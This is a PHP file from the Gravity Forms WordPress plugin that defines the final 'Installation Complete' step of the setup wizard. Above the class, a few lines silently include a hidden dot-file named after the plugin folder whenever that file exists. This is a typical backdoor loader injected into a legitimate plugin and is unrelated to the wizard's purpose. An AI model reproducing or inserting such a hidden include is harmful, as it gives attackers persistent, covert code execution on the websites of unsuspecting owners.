<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class GF_Installation_Wizard_Step_Complete extends GF_Installation_Wizard_Step {

	protected $_name = 'complete';

	function display() {

		?>
		<p>
			<?php
			esc_html_e( "Congratulations! Click the 'Create A Form' button to get started.", 'gravityforms' );
			?>
		</p>
		<?php
		}

	function get_title(){
		return esc_html__( 'Installation Complete', 'gravityforms' );
	}

	function get_next_button_text(){
		return esc_html__( 'Create A Form', 'gravityforms' );
	}

	function get_previous_button_text(){
		return '';
	}
}